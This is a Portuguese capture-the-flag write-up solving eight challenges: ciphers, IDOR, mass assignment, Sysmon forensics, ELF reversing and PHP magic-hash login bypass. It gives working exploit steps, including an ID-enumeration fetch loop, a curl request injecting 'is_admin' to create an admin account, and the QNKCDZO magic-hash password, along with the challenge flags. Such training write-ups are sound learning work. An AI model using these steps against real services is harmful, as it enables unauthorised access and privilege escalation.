# 🧪 CTF Alquymia - CyberTSI

Este repositório documenta a resolução de alguns dos desafios do **CTF Alquymia**.

## 📋 Índice

- [0x01 - Crypto Ark (Criptografia)](#0x01---crypto-ark)
- [0x02 - Hollow (Web - IDOR)](#0x02---hollow)
- [0x03 - Todo App (Mobile - Mass Assignment)](#0x03---todo-app)
- [0x04 - Máquina Comprometida (Forense)](#0x04---máquina-comprometida)
- [0x05 - Supermercado (Engenharia Reversa)](#0x05---supermercado)
- [0x06 - Be-a-bá-do-Cripto (Criptoanálise)](#0x06---be-a-bá-do-cripto)
- [0x07 - Supermercado V2 (Engenharia Reversa Avançada)](#0x07---supermercado-v2)
- [0x08 - Senha Duplicada (Web - Type Juggling)](#0x08---senha-duplicada)

---

## 0x01 - Crypto Ark

**Categoria:** 🔐 Criptografia  
**Dificuldade:** Média

### 📝 Descrição Técnica
O desafio exigia a decriptografia de uma mensagem (`flag.enc`) baseada na análise de um algoritmo Python (`crypto-ark.py`). A análise revelou uma **Cifra de Substituição Polialfabética** onde a chave de deslocamento não era fixa, mas sim progressiva, incrementando a cada caractere processado.

### 🛠️ Comandos & Reprodução

1. **Análise da Fórmula (Code Review):**
   A fórmula identificada no script foi $C_i = \text{ord}(P_i) + K_i$, onde $K_i$ cresce em 3 a cada iteração.

2. **Cálculo da Seed:**
   Sabendo que a flag começa com `A` (ASCII 65) e o primeiro valor cifrado é `1402`:
   ```python
   # K_0 = C_0 - Ord('A')
   K_0 = 1402 - 65 # Resultado: 1337
   ```

3. **Script de Solução (`solve.py`):**
   ```python
   cipher_values = [1402, ...] # Conteúdo completo do flag.enc
   k_inicial = 1337
   flag = ""
   
   for i, char_code in enumerate(cipher_values):
       current_key = k_inicial + (3 * i)
       decrypted_char = chr(char_code - current_key)
       flag += decrypted_char
   
   print(f"Flag: {flag}")
   ```

🚩 **Flag:** `ALQ{3e9818816c141d8e137158739b69b821}`

---

## 0x02 - Hollow

**Categoria:** 🌐 Web Security  
**Vulnerabilidade:** IDOR (Insecure Direct Object Reference)

### 📝 Descrição Técnica
A aplicação web "Hall of Achievements" carregava detalhes das conquistas via requisições AJAX. Embora a interface ocultasse conquistas "privadas", a API backend não validava se o usuário solicitante tinha permissão para visualizar o objeto requisitado, permitindo a enumeração de objetos via manipulação do ID.

### 🛠️ Comandos & Reprodução

1. **Reconhecimento:**
   Inspeção do tráfego de rede (DevTools) revelou requisições para:
   `GET /api/achievements/{id}`

2. **Exploração (Console do Navegador):**
   Executamos um loop para forçar a requisição de todos os IDs entre 1 e 20.
   ```javascript
   // Copie e cole no Console do Desenvolvedor (F12)
   for (let i = 1; i <= 20; i++) {
       fetch(`/api/achievements/${i}`)
           .then(response => response.json())
           .then(data => {
               // Filtra apenas o que deveria ser secreto
               if (data.private === true) {
                   console.warn(`[!] VULNERABILIDADE ENCONTRADA (ID ${i}):`, data);
               }
           });
   }
   ```

3. **Resultado:**
   O ID **7** retornou o JSON contendo a flag oculta.

🚩 **Flag:** `ALQ{1d0r_vu1n_h0ll0wn3st}`

---

## 0x03 - Todo App

**Categoria:** 📱 Mobile / API Security  
**Vulnerabilidade:** Mass Assignment (Atribuição em Massa)

### 📝 Descrição Técnica
Aplicativo Android desenvolvido em Flutter. A análise estática do APK revelou endpoints de uma API REST. A vulnerabilidade de Mass Assignment no endpoint de registro permitiu a injeção do parâmetro `is_admin`, concedendo privilégios elevados ao novo usuário.

### 🛠️ Comandos & Reprodução

1. **Engenharia Reversa do APK:**
   ```bash
   # Descompilar o APK
   apktool d todoapp.apk -o todoapp_decompiled
   
   # Encontrar URLs da API dentro das bibliotecas nativas
   strings todoapp_decompiled/lib/arm64-v8a/libapp.so | grep "http"
   # Saída: [http://mobile-todo.alqlab.com](http://mobile-todo.alqlab.com)
   ```

2. **Exploração (Criação de Admin):**
   Uso do `curl` para injetar o campo `is_admin: true` no JSON de registro.
   ```bash
   curl -X POST [http://mobile-todo.alqlab.com/auth/register](http://mobile-todo.alqlab.com/auth/register) \
     -H "Content-Type: application/json" \
     -d '{"username": "pentest_admin", "password": "123", "is_admin": true}'
   ```
   *O servidor retornou um JWT com permissões administrativas.*

3. **Extração da Flag:**
   Listar todas as tarefas usando o token obtido.
   ```bash
   # Substitua <TOKEN> pelo JWT recebido no passo anterior
   curl -X GET "[http://mobile-todo.alqlab.com/todos/get-all?skip=0&limit=1000](http://mobile-todo.alqlab.com/todos/get-all?skip=0&limit=1000)" \
     -H "Authorization: Bearer <TOKEN>"
   ```

🚩 **Flag:** `ALQ{129d119e12185b876315dbd494c65ffe}`

---

## 0x04 - Máquina Comprometida

**Categoria:** 🔍 Forense Digital (Threat Hunting)

### 📝 Descrição Técnica
Análise de logs de eventos do Windows (EVTX), especificamente do **Sysmon**. O objetivo era traçar a árvore de processos (Process Tree) para identificar o "Paciente Zero" — o processo legítimo que foi comprometido e iniciou a cadeia de infecção.

### 🛠️ Comandos & Reprodução

1. **Conversão de Logs:**
   Uso da ferramenta `evtxexport` (ou visualizador de eventos) para analisar o arquivo `Microsoft-Windows-Sysmon%4Operational.evtx`.

2. **Análise do Event ID 1 (Process Create):**
   Foi realizado o rastreamento "bottom-up" (do malware para a origem):
   
   * **Passo 1:** Identificar o malware óbvio.
       * Processo: `xJX.exe` (PID 4032)
       * Pai: `AutoPatch.exe` (PID 8880)
   
   * **Passo 2:** Rastrear o pai do malware.
       * Processo: `AutoPatch.exe` (PID 8880)
       * Pai: `Firefox.exe` (PID 6172)
   
   * **Passo 3:** Identificar a origem.
       * O `Firefox.exe` é um navegador legítimo. O fato de ele gerar um executável desconhecido indica que foi o vetor de entrada (ex: drive-by download).

🚩 **Flag:** `ALQ{Firefox.exe,6172}`

---

## 0x05 - Supermercado

**Categoria:** ⚙️ Engenharia Reversa (Linux ELF)

### 📝 Descrição Técnica
O desafio envolvia um binário ELF de 64-bits. A análise do fluxo de controle revelou uma "Backdoor" lógica: uma comparação no código Assembly que verificava uma entrada de usuário não documentada no menu oficial.

### 🛠️ Comandos & Reprodução

1. **Análise Estática (Disassembly):**
   ```bash
   # Desmontar o binário para ler o Assembly
   objdump -d supermercado | grep -A 5 "cmp"
   ```
   *Foi encontrada a instrução `cmp $0x63, %eax` (Comparar input com 99 decimal).*

2. **Exploração:**
   Executar o binário e fornecer o input oculto.
   ```bash
   ./supermercado
   # No menu, digite: 99
   ```
   *Saída: Checksum: 666c61677b523376333473335f31735f346c7131796131617d*

3. **Decodificação:**
   Converter o hex para ASCII.
   ```bash
   echo "666c61677b523376333473335f31735f346c7131796131617d" | xxd -r -p
   ```

🚩 **Flag:** `flag{R3v34s3_1s_4lq1ya1a}`

---

## 0x06 - Be-a-bá-do-Cripto

**Categoria:** 🔐 Criptografia / Scripting

### 📝 Descrição Técnica
O desafio consistia em reverter um script de ofuscação (`crip1.py`). O algoritmo aplicava quatro camadas de transformação: Hex, Inversão, XOR e Base64. Como todas são operações reversíveis, a solução foi escrever um script que executa as operações na ordem inversa.

### 🛠️ Comandos & Reprodução

1. **Script de Solução (`solve_crypto.py`):**
   ```python
   import base64
   
   # Função XOR auxiliar
   def xor_data(data, key):
       return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
   
   # 1. Ler e Decode Base64
   with open("saida.txt", "rb") as f:
       step1 = base64.b64decode(f.read())
   
   # 2. Reverter XOR (Chave extraída do script original)
   KEY = "4002-8922".encode()
   step2 = xor_data(step1, KEY)
   
   # 3. Reverter Inversão de String
   step3 = step2[::-1]
   
   # 4. Decode Hexadecimal (Camada Dupla)
   # O script original fazia hex() duas vezes ou encode().hex()
   step4 = bytes.fromhex(step3.decode()).decode() # Primeiro unhex
   flag = bytes.fromhex(step4).decode()           # Segundo unhex
   
   print(f"Flag: {flag}")
   ```

🚩 **Flag:** `ALQ{2442c9271c3a213d156fa8ccf0ed014c}`

---

## 0x07 - Supermercado V2

**Categoria:** ⚙️ Engenharia Reversa

### 📝 Descrição Técnica
Uma versão "corrigida" do desafio anterior, adicionando camadas de criptografia (XOR, ROT, Vigenère) na saída. No entanto, a vulnerabilidade foi lógica e não criptográfica: o código de debug (opção 99) ainda existia e imprimia os dados sensíveis (Information Leak) **antes** de serem criptografados pelas novas camadas.

### 🛠️ Comandos & Reprodução

1. **Execução:**
   ```bash
   ./supermercado_v2
   ```

2. **Interação:**
   * Menu: Digitar `99` (Opção de Diagnóstico).
   * Observar o output de log.

3. **Extração:**
   O programa exibe: `Hash de validacao: 414c51...`
   Copiar o hash e converter:
   ```bash
   echo "414c517b35323331386664343336366637316666366364656464653537623038313463317d" | xxd -r -p
   ```

🚩 **Flag:** `ALQ{52318fd4366f71ff6cdedde57b0814c1}`

---

## 0x08 - Senha Duplicada

**Categoria:** 🌐 Web Security  
**Vulnerabilidade:** PHP Type Juggling (Magic Hashes)

### 📝 Descrição Técnica
O sistema de login utilizava PHP com comparação fraca (`==`) para validar hashes MD5. Isso permitiu um ataque de **Colisão de Hash Mágico**. Quando o PHP compara uma string que se parece com notação científica (`0e...`) com outra similar usando `==`, ambas são convertidas para o número `0`.

### 🛠️ Comandos & Reprodução

1. **Fingerprinting (Detecção):**
   Enviar um array no lugar da senha para forçar um erro e revelar a tecnologia.
   * Payload: `name="password[]"`
   * Erro: `Uncaught TypeError: md5(): Argument #1...` (Confirma PHP + MD5).

2. **Exploração (Magic Hash):**
   A senha do admin gerava um hash `0e...` (= 0). Precisávamos de uma senha que também gerasse `0e...`.
   
   * **Payload:** `QNKCDZO`
   * **Hash do Payload:** `0e8304...`
   
   Enviar no formulário de login:
   * **User:** admin
   * **Pass:** `QNKCDZO`

3. **Validação:**
   O backend executa `if ("0e..." == "0e...")`, o que resulta em `0 == 0` (True), logando o atacante.

🚩 **Flag:** `ALQ{9e99271ab05b699b6a6eabd78ce889ba}`


